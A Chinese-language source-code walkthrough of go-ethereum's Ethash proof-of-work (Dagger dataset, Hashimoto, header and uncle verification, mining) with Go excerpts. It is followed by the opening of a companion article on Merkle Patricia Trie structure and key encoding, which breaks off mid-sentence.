设计原理\nEthash设计目标\n以太坊设计共识算法时，期望达到三个目的：\n\n抗ASIC性：为算法创建专用硬件的优势应尽可能小，让普通计算机用户也能使用CPU进行开采。\n\n通过内存限制来抵制（ASIC使用矿机内存昂贵）\n大量随机读取内存数据时计算速度就不仅仅受限于计算单元，更受限于内存的读出速度。\n\n\n轻客户端可验证性: 一个区块应能被轻客户端快速有效校验。\n矿工应该要求存储完整的区块链状态。\n\n哈希数据集\nethash要计算哈希，需要先有一块数据集。这块数据集较大，初始大小大约有1G，每隔 3 万个区块就会更新一次，且每次更新都会比之前变大8M左右。计算哈希的数据源就是从这块数据集中来的；而决定使用数据集中的哪些数据进行哈希计算的，才是header的数据和Nonce字段。这部分是由Dagger算法实现的。\nDagger\nDagger算法是用来生成数据集Dataset的，核心的部分就是Dataset的生成方式和组织结构。\n可以把Dataset想成多个item（dataItem）组成的数组，每个item是64字节的byte数组（一条哈希）。dataset的初始大小约为1G，每隔3万个区块（一个epoch区间）就会更新一次，且每次更新都会比之前变大8M左右。\nDataset的每个item是由一个缓存块（cache）生成的，缓存块也可以看做多个item（cacheItem）组成，缓存块占用的内存要比dataset小得多，它的初始大小约为16M。同dataset类似，每隔 3 万个区块就会更新一次，且每次更新都会比之前变大128K左右。\n生成一条dataItem的程是：从缓存块中“随机”（这里的“随机”不是真的随机数，而是指事前不能确定，但每次计算得到的都是一样的值）选择一个cacheItem进行计算，得的结果参与下次计算，这个过程会循环 256 次。\n缓存块是由seed生成的，而seed的值与块的高度有关。所以生成dataset的过程如下图所示：\n\nDagger还有一个关键的地方，就是确定性。即同一个epoch内，每次计算出来的seed、缓存、dataset都是相同的。否则对于同一个区块，挖矿的人和验证的人使用不同的dataset，就没法进行验证了。\n\nHashimoto算法\n是Thaddeus Dryja创造的。旨在通过IO限制来抵制矿机。在挖矿过程中，使内存读取限制条件，由于内存设备本身会比计算设备更加便宜以及普遍，在内存升级优化方面，全世界的大公司也都投入巨大，以使内存能够适应各种用户场景，所以有了随机访问内存的概念RAM，因此,现有的内存可能会比较接近最优的评估算法。Hashimoto算法使用区块链作为源数据，满足了上面的 1 和 3 的要求。\n它的作用就是使用区块Header的哈希和Nonce字段、利用dataset数据，生成一个最终的哈希值。\n\n源码解析\n生成哈希数据集\ngenerate函数位于ethash.go文件中，主要是为了生成dataset,其中包扩以下内容。\n生成cache size\ncache size 主要某个特定块编号的ethash验证缓存的大小 *，   epochLength 为 30000，如果epoch 小于 2048，则从已知的epoch返回相应的cache size，否则重新计算epoch\ncache的大小是线性增长的，size的值等于(2^24^ + 2^17^ * epoch - 64)，用这个值除以 64 看结果是否是一个质数，如果不是，减去128 再重新计算，直到找到最大的质数为止。\ncsize := cacheSize(d.epoch*epochLength + 1)\nfunc cacheSize(block uint64) uint64 {\n\tepoch := int(block / epochLength)\n\tif epoch &lt; maxEpoch {\n\t\treturn cacheSizes[epoch]\n\t}\n\treturn calcCacheSize(epoch)\n}\nfunc calcCacheSize(epoch int) uint64 {\n\tsize := cacheInitBytes + cacheGrowthBytes*uint64(epoch) - hashBytes\n\tfor !new(big.Int).SetUint64(size / hashBytes).ProbablyPrime(1) { // Always accurate for n &lt; 2^64\n\t\tsize -= 2 * hashBytes\n\t}\n\treturn size\n}\n生成dataset size\ndataset Size 主要某个特定块编号的ethash验证缓存的大小 , 类似上面生成cache size\ndsize := datasetSize(d.epoch*epochLength + 1)\nfunc datasetSize(block uint64) uint64 {\n\tepoch := int(block / epochLength)\n\tif epoch &lt; maxEpoch {\n\t\treturn datasetSizes[epoch]\n\t}\n\treturn calcDatasetSize(epoch)\n}\n生成 seed 种子\n*seedHash是用于生成验证缓存和挖掘数据集的种子。*长度为 32。\nseed := seedHash(d.epoch*epochLength + 1)\nfunc seedHash(block uint64) []byte {\n\tseed := make([]byte, 32)\n\tif block &lt; epochLength {\n\t\treturn seed\n\t}\n\tkeccak256 := makeHasher(sha3.NewLegacyKeccak256())\n\tfor i := 0; i &lt; int(block/epochLength); i++ {\n\t\tkeccak256(seed, seed)\n\t}\n\treturn seed\n}\n生成cache\ngenerateCache(cache, d.epoch, seed)\n接下来分析generateCache的关键代码：\n先了解一下hashBytes，在下面的计算中都是以此为单位，它的值为 64 ，相当于一个keccak512哈希的长度,下文以item称呼[hashBytes]byte。\n①：初始化cache\n此循环用来初始化cache：先将seed的哈希填入cache的第一个item,随后使用前一个item的哈希，填充后一个item。\nfor offset := uint64(hashBytes); offset &lt; size; offset += hashBytes {\n\t\tkeccak512(cache[offset:], cache[offset-hashBytes:offset])\n\t\tatomic.AddUint32(&amp;progress, 1)\n\t}\n②：对cache中数据按规则做异或\n为对于每一个item（srcOff），“随机”选一个item（xorOff）与其进行异或运算；将运算结果的哈希写入dstOff中。这个运算逻辑将进行cacheRounds次。\n两个需要注意的地方：\n\n一是srcOff是从尾部向头部变化的，而dstOff是从头部向尾部变化的。并且它俩是对应的，即当srcOff代表倒数第x个item时，dstOff则代表正数第x个item。\n二是xorOff的选取。注意我们刚才的“随机”是打了引号的。xorOff的值看似随机，因为在给出seed之前，你无法知道xorOff的值是多少；但一旦seed的值确定了，那么每一次xorOff的值都是确定的。而seed的值是由区块的高度决定的。这也是同一个epoch内总是能得到相同cache数据的原因。\n\nfor i := 0; i &lt; cacheRounds; i++ {\n\t\tfor j := 0; j &lt; rows; j++ {\n\t\t\tvar (\n\t\t\t\tsrcOff = ((j - 1 + rows) % rows) * hashBytes\n\t\t\t\tdstOff = j * hashBytes\n\t\t\t\txorOff = (binary.LittleEndian.Uint32(cache[dstOff:]) % uint32(rows)) * hashBytes\n\t\t\t)\n\t\t\tbitutil.XORBytes(temp, cache[srcOff:srcOff+hashBytes], cache[xorOff:xorOff+hashBytes])\n\t\t\tkeccak512(cache[dstOff:], temp)\n \n\t\t\tatomic.AddUint32(&amp;progress, 1)\n\t\t}\n\t}\n\n生成dataset\ndataset大小的计算和cache类似，量级不同：2^30^ + 2^23^ * epoch - 128，然后每次减256寻找最大质数。\n生成数据是一个循环，每次生成64个字节，主要的函数是generateDatasetItem：\ngenerateDatasetItem的数据来源就是cache数据，而最终的dataset值会存储在mix变量中。整个过程也是由多个循环构成。\n①：初始化mix变量\n根据cache值对mix变量进行初始化。其中hashWords代表的是一个hash里有多少个word值：一个hash的长度为hashBytes即64字节，一个word（uint32类型）的长度为 4 字节，因此hashWords值为 16。选取cache中的哪一项数据是由参数index和i变量决定的。\n\tmix := make([]byte, hashBytes)\n\tbinary.LittleEndian.PutUint32(mix, cache[(index%rows)*hashWords]^index)\n\tfor i := 1; i &lt; hashWords; i++ {\n\t\tbinary.LittleEndian.PutUint32(mix[i*4:], cache[(index%rows)*hashWords+uint32(i)])\n\t}\n\tkeccak512(mix, mix)\n②：将mix转换成[]uint32类型\nintMix := make([]uint32, hashWords)\n\tfor i := 0; i &lt; len(intMix); i++ {\n\t\tintMix[i] = binary.LittleEndian.Uint32(mix[i*4:])\n\t}\n③：将cache数据聚合进intmix\nfor i := uint32(0); i &lt; datasetParents; i++ {\n\t\tparent := fnv(index^i, intMix[i%16]) % rows\n\t\tfnvHash(intMix, cache[parent*hashWords:])\n\t}\nFNV哈希算法，是一种不需要使用密钥的哈希算法。\n这个算法很简单：a乘以FNV质数0x01000193，然后再和b异或。\n首先用这个算法算出一个索引值，利用这个索引从cache中选出一个值（data），然后对mix中的每个字节都计算一次FNV，得到最终的哈希值。\nfunc fnv(a, b uint32) uint32 {\n    return a*0x01000193 ^ b\n}\nfunc fnvHash(mix []uint32, data []uint32) {\n    for i := 0; i &lt; len(mix); i++ {\n        mix[i] = mix[i]*0x01000193 ^ data[i]\n    }\n}\n④：将intMix又恢复成mix并计算mix的哈希返回\nfor i, val := range intMix {\n\t\tbinary.LittleEndian.PutUint32(mix[i*4:], val)\n\t}\n\tkeccak512(mix, mix)\n\treturn mix\ngenerateCache和generateDataset是实现Dagger算法的核心函数，到此整个生成哈希数据集的的过程结束。\n\n共识引擎核心函数\n代码位于consensus.go\n\n①：Author\n// 返回coinbase, coinbase是打包第一笔交易的矿工的地址\nfunc (ethash *Ethash) Author(header *types.Header) (common.Address, error) {\n\treturn header.Coinbase, nil\n}\n②：VerifyHeader\n主要有两步检查，第一步检查header是否已知或者是未知的祖先，第二步是ethash的检查：\n2.1 header.Extra 不能超过32字节\nif uint64(len(header.Extra)) &gt; params.MaximumExtraDataSize {  // 不超过32字节\n\t\treturn fmt.Errorf(&quot;extra-data too long: %d &gt; %d&quot;, len(header.Extra), params.MaximumExtraDataSize)\n\t}\n2.2 时间戳不能超过15秒，15秒以后的就被认定为未来的块\nif !uncle {\n\t\tif header.Time &gt; uint64(time.Now().Add(allowedFutureBlockTime).Unix()) {\n\t\t\treturn consensus.ErrFutureBlock\n\t\t}\n\t}\n2.3 当前header的时间戳小于父块的\nif header.Time &lt;= parent.Time { // 当前header的时间小于等于父块的\n\t\treturn errZeroBlockTime\n\t}\n2.4 根据时间戳和父块的难度来验证块的难度\nexpected := ethash.CalcDifficulty(chain, header.Time, parent)\n\tif expected.Cmp(header.Difficulty) != 0 {\n\t\treturn fmt.Errorf(&quot;invalid difficulty: have %v, want %v&quot;, header.Difficulty, expected)\n\t}\n2.5验证gas limit小于2^63^ -1\ncap := uint64(0x7fffffffffffffff)\n\tif header.GasLimit &gt; cap {\n\t\treturn fmt.Errorf(&quot;invalid gasLimit: have %v, max %v&quot;, header.GasLimit, cap)\n\t}\n2.6 确认gasUsed为⇐ gasLimit\nif header.GasUsed &gt; header.GasLimit {\n\t\treturn fmt.Errorf(&quot;invalid gasUsed: have %d, gasLimit %d&quot;, header.GasUsed, header.GasLimit)\n\t}\n2.7 验证块号是父块加1\nif diff := new(big.Int).Sub(header.Number, parent.Number); diff.Cmp(big.NewInt(1)) != 0 {\n\t\treturn consensus.ErrInvalidNumber\n\t}\n2.8检查给定的块是否满足pow难度要求\nif seal {\n\t\tif err := ethash.VerifySeal(chain, header); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n③：VerifyUncles\n3.1叔叔块最多两个\nif len(block.Uncles()) &gt; maxUncles {\n\t\treturn errTooManyUncles\n\t}\n3.2收集叔叔块和祖先块\nnumber, parent := block.NumberU64()-1, block.ParentHash()\n\tfor i := 0; i &lt; 7; i++ {\n\t\tancestor := chain.GetBlock(parent, number)\n\t\tif ancestor == nil {\n\t\t\tbreak\n\t\t}\n\t\tancestors[ancestor.Hash()] = ancestor.Header()\n\t\tfor _, uncle := range ancestor.Uncles() {\n\t\t\tuncles.Add(uncle.Hash())\n\t\t}\n\t\tparent, number = ancestor.ParentHash(), number-1\n\t}\n\tancestors[block.Hash()] = block.Header()\n\tuncles.Add(block.Hash())\n \n3.3 确保叔块只被奖励一次且叔块有个有效的祖先\nfor _, uncle := range block.Uncles() {\n\t\t// Make sure every uncle is rewarded only once\n\t\thash := uncle.Hash()\n\t\tif uncles.Contains(hash) {\n\t\t\treturn errDuplicateUncle\n\t\t}\n\t\tuncles.Add(hash)\n \n\t\t// Make sure the uncle has a valid ancestry\n\t\tif ancestors[hash] != nil {\n\t\t\treturn errUncleIsAncestor\n\t\t}\n\t\tif ancestors[uncle.ParentHash] == nil || uncle.ParentHash == block.ParentHash() {\n\t\t\treturn errDanglingUncle\n\t\t}\n\t\tif err := ethash.verifyHeader(chain, uncle, ancestors[uncle.ParentHash], true, true); err != nil {\n\t\t\treturn err\n\t\t}\n④：Prepare\n\n初始化header的Difficulty字段\n\nparent := chain.GetHeader(header.ParentHash, header.Number.Uint64()-1)\n\tif parent == nil {\n\t\treturn consensus.ErrUnknownAncestor\n\t}\n\theader.Difficulty = ethash.CalcDifficulty(chain, header.Time, parent)\n\treturn nil\n⑤：Finalize会执行交易后的所有状态修改（例如，区块奖励），但不会组装该区块。\n5.1累积任何块和叔块的奖励\naccumulateRewards(chain.Config(), state, header, uncles)\n5.2计算状态树的根哈希并提交到header\nheader.Root = state.IntermediateRoot(chain.Config().IsEIP158(header.Number))\n⑥：FinalizeAndAssemble 运行任何交易后状态修改（例如，块奖励），并组装最终块。\nfunc (ethash *Ethash) FinalizeAndAssemble(chain consensus.ChainReader, header *types.Header, state *state.StateDB, txs []*types.Transaction, uncles []*types.Header, receipts []*types.Receipt) (*types.Block, error) {\n\taccumulateRewards(chain.Config(), state, header, uncles)\n\theader.Root = state.IntermediateRoot(chain.Config().IsEIP158(header.Number))\n\treturn types.NewBlock(header, txs, uncles, receipts), nil\n}\n很明显就是比Finalize多了 types.NewBlock\n⑦：SealHash返回在seal之前块的哈希（会跟seal之后的块哈希不同）\nfunc (ethash *Ethash) SealHash(header *types.Header) (hash common.Hash) {\n\thasher := sha3.NewLegacyKeccak256()\n \n\trlp.Encode(hasher, []interface{}{\n\t\theader.ParentHash,\n\t\theader.UncleHash,\n\t\theader.Coinbase,\n\t\theader.Root,\n\t\theader.TxHash,\n\t\theader.ReceiptHash,\n\t\theader.Bloom,\n\t\theader.Difficulty,\n\t\theader.Number,\n\t\theader.GasLimit,\n\t\theader.GasUsed,\n\t\theader.Time,\n\t\theader.Extra,\n\t})\n\thasher.Sum(hash[:0])\n\treturn hash\n}\n⑧：Seal给定的输入块生成一个新的密封请求（挖矿），并将结果推送到给定的通道中。\n注意，该方法将立即返回并将异步发送结果。 根据共识算法，可能还会返回多个结果。这部分会在下面的挖矿中具体分析，这里跳过。\n\n挖矿细节\n\n大家在阅读本文时有任何疑问均可留言给我，我一定会及时回复。如果觉得写得不错可以关注最下方参考的 github项目，可以第一时间关注作者文章动态。\n\n挖矿的核心接口定义：\nSeal(chain ChainReader, block *types.Block, results chan&lt;- *types.Block, stop &lt;-chan struct{}) error\n进入到seal函数：\n①：如果运行错误的POW，直接返回空的nonce和MixDigest，同时块也是空块。\nif ethash.config.PowMode == ModeFake || ethash.config.PowMode == ModeFullFake {\n\t\theader := block.Header()\n\t\theader.Nonce, header.MixDigest = types.BlockNonce{}, common.Hash{}\n\t\tselect {\n\t\tcase results &lt;- block.WithSeal(header):\n\t\tdefault:\n\t\t\tethash.config.Log.Warn(&quot;Sealing result is not read by miner&quot;, &quot;mode&quot;, &quot;fake&quot;, &quot;sealhash&quot;, ethash.SealHash(block.Header()))\n\t\t}\n\t\treturn nil\n\t}\n②：共享pow的话，则转到它的共享对象执行Seal操作\nif ethash.shared != nil {\n\t\treturn ethash.shared.Seal(chain, block, results, stop)\n\t}\n③：获取种子源，并根据其生成ethash需要的种子\nf ethash.rand == nil {\n\t\t// 获得种子\n\t\tseed, err := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))\n\t\tif err != nil {\n\t\t\tethash.lock.Unlock()\n\t\t\treturn err\n\t\t}\n\t\tethash.rand = rand.New(rand.NewSource(seed.Int64())) // 给rand赋值\n\t}\n④：挖矿的核心工作交给mine\nfor i := 0; i &lt; threads; i++ {\n\t\tpend.Add(1)\n\t\tgo func(id int, nonce uint64) {\n\t\t\tdefer pend.Done()\n\t\t\tethash.mine(block, id, nonce, abort, locals) // 真正执行挖矿的动作\n\t\t}(i, uint64(ethash.rand.Int63()))\n\t}\n⑤：处理挖矿的结果\n\n外部意外中止，停止所有挖矿线程\n其中一个线程挖到正确块，中止其他所有线程\nethash对象发生改变，停止当前所有操作，重启当前方法\n\ngo func() {\n\t\tvar result *types.Block\n\t\tselect {\n\t\tcase &lt;-stop:\n\t\t\tclose(abort)\n\t\tcase result = &lt;-locals:\n\t\t\tselect {\n\t\t\tcase results &lt;- result: //其中一个线程挖到正确块，中止其他所有线程\n\t\t\tdefault:\n\t\t\t\tethash.config.Log.Warn(&quot;Sealing result is not read by miner&quot;, &quot;mode&quot;, &quot;local&quot;, &quot;sealhash&quot;, ethash.SealHash(block.Header()))\n\t\t\t}\n\t\t\tclose(abort)\n\t\tcase &lt;-ethash.update:\n\t\t\tclose(abort)\n\t\t\tif err := ethash.Seal(chain, block, results, stop); err != nil {\n\t\t\t\tethash.config.Log.Error(&quot;Failed to restart sealing after update&quot;, &quot;err&quot;, err)\n\t\t\t}\n\t\t}\n由上可以知道seal的核心工作是由mine函数完成的，重点介绍一下。\nmine函数其实也比较简单，它是真正的pow矿工，用来搜索一个nonce值，nonce值开始于seed值，seed值是能最终产生正确的可匹配可验证的区块难度\n①：从区块头中提取相关数据，放在全局变量域中\nvar (\n\t\theader  = block.Header()\n\t\thash    = ethash.SealHash(header).Bytes()\n\t\ttarget  = new(big.Int).Div(two256, header.Difficulty) // 这是用来验证的target\n\t\tnumber  = header.Number.Uint64()\n\t\tdataset = ethash.dataset(number, false)\n\t)\n②：开始产生随机nonce，直到我们中止或找到一个好的nonce\nvar (\n\t\tattempts = int64(0)\n\t\tnonce    = seed\n\t)\n③： 聚集完整的dataset数据，为特定的header和nonce产生最终哈希值\nfunc hashimotoFull(dataset []uint32, hash []byte, nonce uint64) ([]byte, []byte) {\n  //定义一个lookup函数，用于在数据集中查找数据\n\tlookup := func(index uint32) []uint32 {\n\t\toffset := index * hashWords //hashWords是上面定义的常量值= 16\n\t\treturn dataset[offset : offset+hashWords]\n\t}\n\treturn hashimoto(hash, nonce, uint64(len(dataset))*4, lookup)\n}\n可以发现实际上hashimotoFull函数做的工作就是将原始数据集进行了读取分割，然后传给hashimoto函数。接下来重点分析hashimoto函数：\n3.1根据seed获取区块头\n\trows := uint32(size / mixBytes) ①\n\tseed := make([]byte, 40) ②\n\tcopy(seed, hash) ③\n\tbinary.LittleEndian.PutUint64(seed[32:], nonce)④\n\tseed = crypto.Keccak512(seed)⑤\n\tseedHead := binary.LittleEndian.Uint32(seed)⑥\n\n计算数据集的行数\n合并header+nonce到一个 40 字节的seed\n将区块头的hash拷贝到seed中\n将nonce值填入seed的后（40-32=8）字节中去，（nonce本身就是uint64类型，是 64 位，对应 8 字节大小），正好把hash和nonce完整的填满了 40 字节的 seed\nKeccak512加密seed\n从seed中获取区块头\n\n3.2 从复制的种子开始混合\n\nmixBytes常量= 128，mix的长度为 32，元素为uint32，是 32位，对应为 4 字节大小。所以mix总共大小为 4*32=128 字节大小\n\nmix := make([]uint32, mixBytes/4)\n\tfor i := 0; i &lt; len(mix); i++ {\n\t\tmix[i] = binary.LittleEndian.Uint32(seed[i%16*4:])\n\t}\n3.3 混合随机数据集节点\ntemp := make([]uint32, len(mix))//与mix结构相同，长度相同\n\tfor i := 0; i &lt; loopAccesses; i++ {\n\t\tparent := fnv(uint32(i)^seedHead, mix[i%len(mix)]) % rows\n\t\tfor j := uint32(0); j &lt; mixBytes/hashBytes; j++ {\n\t\t\tcopy(temp[j*hashWords:], lookup(2*parent+j))\n\t\t}\n\t\tfnvHash(mix, temp)\n\t}\n3.4 压缩混合\nfor i := 0; i &lt; len(mix); i += 4 {\n\t\tmix[i/4] = fnv(fnv(fnv(mix[i], mix[i+1]), mix[i+2]), mix[i+3])\n\t}\n\tmix = mix[:len(mix)/4]\n \n\tdigest := make([]byte, common.HashLength)\n\tfor i, val := range mix {\n\t\tbinary.LittleEndian.PutUint32(digest[i*4:], val)\n\t}\n\treturn digest, crypto.Keccak256(append(seed, digest...))\n最终返回的是digest和digest与seed的哈希；而digest其实就是mix的[]byte形式。在前面Ethash.mine的代码中我们已经看到使用第二个返回值与target变量进行比较，以确定这是否是一个有效的哈希值。\n\n验证pow\n挖矿信息的验证有两部分：\n\n验证Header.Difficulty是否正确\n验证Header.MixDigest和Header.Nonce是否正确\n\n①：验证Header.Difficulty的代码主要在Ethash.verifyHeader中：\nfunc (ethash *Ethash) verifyHeader(chain consensus.ChainReader, header, parent *types.Header, uncle bool, seal bool) error {\n  ......\n  expected := ethash.CalcDifficulty(chain, header.Time.Uint64(), parent)\n \n  if expected.Cmp(header.Difficulty) != 0 {\n    return fmt.Errorf(&quot;invalid difficulty: have %v, want %v&quot;, header.Difficulty, expected)\n  }\n}\n通过区块高度和时间差作为参数来计算Difficulty值，然后与待验证的区块的Header.Difficulty字段进行比较，如果相等则认为是正确的。\n②：MixDigest和Nonce的验证主要是在Header.verifySeal中：\n验证的方式:使用Header.Nonce和头部哈希通过hashimoto重新计算一遍MixDigest和result哈希值,并且验证的节点是不需要dataset数据的。\n\n总结&amp;参考\n\ngithub.com/blockchainGuide\n公众号：区块链技术栈  （推荐哦）\neth.wiki/concepts/ethash/design-rationale\neth.wiki/concepts/ethash/dag\nwww.vijaypradeep.com/blog/2017-04-28-ethereums-memory-hardness-explained/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之MPT树-上-13":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之MPT树-上-13","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之MPT树-上-13.md","title":"死磕以太坊源码分析之MPT树-上-13","links":[],"tags":[],"content":"\n死磕以太坊源码分析之MPT树-上\n\n前缀树Trie\n前缀树（又称字典树），通常来说，一个前缀树是用来存储字符串的。前缀树的每一个节点代表一个字符串（前缀）。每一个节点会有多个子节点，通往不同子节点的路径上有着不同的字符。子节点代表的字符串是由节点本身的原始字符串，以及通往该子节点路径上所有的字符组成的。如下图所示：\n\nTrie的结点看上去是这样子的：\n\n[ [Ia, Ib, … I*], value]\n\n其中 [Ia, Ib, ... I*] 在本文中我们将其称为结点的 索引数组 ，它以 key 中的下一个字符为索引，每个元素I*指向对应的子结点。 value 则代表从根节点到当前结点的路径组成的key所对应的值。如果不存在这样一个 key，则 value 的值为空。\n前缀树的性质：\n\n\n每一层节点上面的值都不相同；\n\n\n根节点不存储值；除根节点外每一个节点都只包含一个字符，代表的字符串是由节点本身的原始字符串，以及通往该子节点路径上所有的字符。\n\n\n前缀树的查找效率是O(m)，m为所查找节点的长度，而哈希表的查找效率为O(1)。且一次查找会有 m 次 IO开销，相比于直接查找，无论是速率、还是对磁盘的压力都比较大。\n\n\n当存在一个节点，其内容很长（如一串很长的字符串），当树中没有与他相同前缀的分支时，为了存储该节点，需要创建许多非叶子节点来构建根节点到该节点间的路径，造成了存储空间的浪费。\n\n\n压缩前缀树Patricia Tree\n基数树（也叫基数特里树或压缩前缀树）是一种数据结构，是一种更节省空间的前缀树，其中作为唯一子节点的每个节点都与其父节点合并，边既可以表示为元素序列又可以表示为单个元素。 因此每个内部节点的子节点数最多为基数树的基数 r ，其中 r 为正整数， x 为 2 的幂， x≥1 ，这使得基数树更适用于对于较小的集合（尤其是字符串很长的情况下）和有很长相同前缀的字符串集合。\n\n图中可以很容易看出数中所存储的键值对：\n\n6c0a5c71ec20bq3w ⇒ 5\n6c0a5c71ec20CX7j ⇒ 27\n6c0a5c71781a1FXq ⇒ 18\n6c0a5c71781a9Dog ⇒ 64\n6c0a8f743b95zUfe ⇒ 30\n6c0a8f743b95jx5R ⇒ 2\n6c0a8f740d16y03G ⇒ 43\n6c0a8f740d16vcc1 ⇒ 48\n\n默克尔树Merkle Tree\nMerkle树看起来非常像二叉树，其叶子节点上的值通常为数据块的哈希值，而非叶子节点上的值，所以有时候Merkle tree也表示为Hash tree，如下图所示：\n\n在构造Merkle树时，首先要计算数据块的哈希值，通常，选用SHA-256等哈希算法。但如果仅仅防止数据不是蓄意的损坏或篡改，可以改用一些安全性低但效率高的校验和算法，如CRC。然后将数据块计算的哈希值两两配对（如果是奇数个数，最后一个自己与自己配对），计算上一层哈希，再重复这个步骤，一直到计算出根哈希值。\n所以我们可以简单总结出merkle Tree 有以下几个性质：\n\n校验整体数据的正确性\n快速定位错误\n快速校验部分数据是否在原始的数据中\n存储空间开销大（大量中间哈希）\n\n以太坊的改进方案\n使用[]byte作为key类型\n在以太坊的Trie模块中，key和value都是[]byte类型。如果要使用其它类型，需要将其转换成[]byte类型（比如使用rlp进行转换）。\nNibble ：是 key 的基本单元，是一个四元组（四个 bit 位的组合例如二进制表达的 0010 就是一个四元组）\n在Trie模块对外提供的接口中，key类型是[]byte。但在内部实现里，将key中的每个字节按高4位和低4位拆分成了两个字节。比如你传入的key是：\n\n[0x1a, 0x2b, 0x3c, 0x4d]\n\nTrie内部将这个key拆分成：\n\n[0x1, 0xa, 0x2, 0xb, 0x3, 0xc, 0x4, 0xd]\n\nTrie内部的编码中将拆分后的每一个字节称为 nibble\n如果使用一个完整的 byte 作为 key 的最小单位，那么前文提到的索引数组的大小应该是 256（byte作为数组的索引，最大值为255，最小值为0）。而索引数组的每个元素都是一个 32 字节的哈希,这样每个结点要占用大量的空间。并且索引数组中的元素多数情况下是空的，不指向任何结点。因此这种实现方法占用大量空间而不使用。以太坊的改进方法，可以将索引数组的大小降为 16（4个bit的最大值为0xF，最小值为 0），因此大大减少空间的浪费。\n新增类型节点\n前缀树和merkle树存在明显的局限性，所以以太坊为MPT树新增了几种不同类型的树节点，通过针对不同节点不同操作来解决效率以及存储上的问题。\n\nshortNode: 叶子节点或者扩展节点，当 shortNode.Key的末尾字节是终止符 16 时表示为叶子节点。当 shortNode 是叶子节点是，Val 是 valueNode。\nfullNode:  分支节点，fullNode[16]的类型是 valueNode。前 16 个元素对应键中可能存在的一个十六进制字符。如果键[key,value]在对应的分支处结束，则在列表末尾存储 value 。\nhashNode: 应该取名为 collapsedNode 折叠节点更合适些，但因为其值是一个哈希值当做指针使用，所以取名 hashNode。使用这个哈希值可以从数据库读取节点数据展开节点。\nvalueNode: 数据节点，实际的业务数据值，严格来说他不属于树中的节点，它只存在于 fullNode.Children 或者 shortNode.Val 中。\n\n简单先看个例子，假设有3个键值对，看一下在以太坊中是怎么以MPT的形式存储的：\n\n以太坊中使用到的MPT树结构\n\nState Trie 区块头中的状态树\n\nkey ⇒ sha3(以太坊账户地址 address)\nvalue ⇒ rlp(账号内容信息 account)\n\n\nTransactions Trie 区块头中的交易树\n\nkey ⇒ rlp(交易的偏移量 transaction index)\n每个块都有各自的交易树，且不可更改\n\n\nReceipts Trie 区块头中的收据树\n\nkey = rlp(交易的偏移量 transaction index)\n每个块都有各自的交易树，且不可更改\n\n\nStorage Trie 存储树\n\n存储只能合约状态\n每个账号有自己的 Storage Trie\n\n\n\n\n这两个区块头中，state root、tx root、 receipt root分别存储了这三棵树的树根，第二个区块显示了当账号 17 5的数据变更(27 → 45)的时候，只需要存储跟这个账号相关的部分数据，而且老的区块中的数据还是可以正常访问。\nkey编码规则\n三种编码方式分别为：\n\nRaw编码（原生的字符）；\nHex编码（扩展的16进制编码）；\nHex-Prefix编码（16进制前缀编码）；\n\nRaw编码\nRaw编码就是原生的key值，不做任何改变。这种编码方式的key，是MPT对外提供接口的默认编码方式。\n\n例如一条key为“cat”，value为“dog”的数据项，其Raw编码就是[‘c’, ‘a’, ‘t’]，换成ASCII表示方式就是[63, 61, 74]\n\nHex编码\nHex编码用于对内存中MPT树节点key进行编码.\n为了减少分支节点孩子的个数，将数据 key 进行半字节拆解而成。即依次将 key[0],key[1],…,key[n] 分别进行半字节拆分成两个数，再依次存放在长度为 len(key)+1 的数组中。 并在数组末尾写入终止符 16。算法如下：\n\n半字节，在计算机中，通常将8位二进制数称为字节，而把4位二进制数称为半字节。 高四位和低四位，这里的“位”是针对二进制来说的。比如数字 250 的二进制数为 11111010，则高四位是左边的 1111，低四位是右边的 1010。\n\n从Raw编码向Hex编码的转换规则是：\n\nRaw编码输入的每个字符分解为高 4 位和低 4 位\n如果是叶子节点，则在最后加上Hex值0x10表示结束\n如果是分支节点不附加任何Hex值\n\n例如：字符串 “romane” 的 bytes 是 [114 111 109 97 110 101]，在 HEX 编码时将其依次处理：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nikey[i]key[i]二进制nibbles[i*2]=高四位nibbles[i*2+1]=低四位0114011100100111= 70010= 21111011011110110=61111=152109011011010110=61101=13397011000010110=60001=14110011011100110=61110=145101011001010110=60101=5\n最终得到 Hex(“romane”) = [7 2 6 15 6 13 6 1 6 14 6 5 16]\n// 源码实现\nfunc keybytesToHex(str []byte) []byte {\n\tl := len(str)*2 + 1\n\tvar nibbles = make([]byte, l)\n\tfor i, b := range str {\n\t\tnibbles[i*2] = b / 16   // 高四位\n\t\tnibbles[i*2+1] = b % 16 // 低四位\n\t}\n\tnibbles[l-1] = 16 // 最后一位存入标示符 代表是hex编码\n\treturn nibbles\n}\nHex-Prefix编码\n数学公式定义：\n\nHex-Prefix 编码是一种任意量的半字节转换为数组的有效方式，还可以在存入一个标识符来区分不同节点类型。 因此 HP 编码是在由一个标识符前缀和半字节转换为数组的两部分组成。存入到数据库中存在节点 Key 的只有扩展节点和叶子节点，因此 HP 只用于区分扩展节点和叶子节点，不涉及无节点 key 的分支节点。其编码规则如下图：\n\n前缀标识符由两部分组成：节点类型和奇偶标识，并存储在编码后字节的第一个半字节中。 0 表示扩展节点类型，1 表示叶子节点，偶为 0，奇为 1。最终可以得到唯一标识的前缀标识：\n\n0：偶长度的扩展节点\n1：奇长度的扩展节点\n2：偶长度的叶子节点\n3：奇长度的叶子节点\n\n当偶长度时，第一个字节的低四位用0填充，当是奇长度时，则将 key[0] 存放在第一个字节的低四位中，这样 HP 编码结果始终是偶长度。 这里为什么要区分节点 key 长度的奇偶呢？这是因为，半字节 1 和 01 在转换为 bytes 格式时都成为&lt;01&gt;，无法区分两者。\n例如，上图 “以太坊 MPT 树的哈希计算”中的控制节点1的key 为 [ 7 2 6 f 6 d]，因为是偶长度，则 HP[0]= (00000000) =0，H[1:]= 解码半字节(key)。 而节点 3 的 key 为 [1 6 e 6 5]，为奇长度，则 HP[0]= (0001 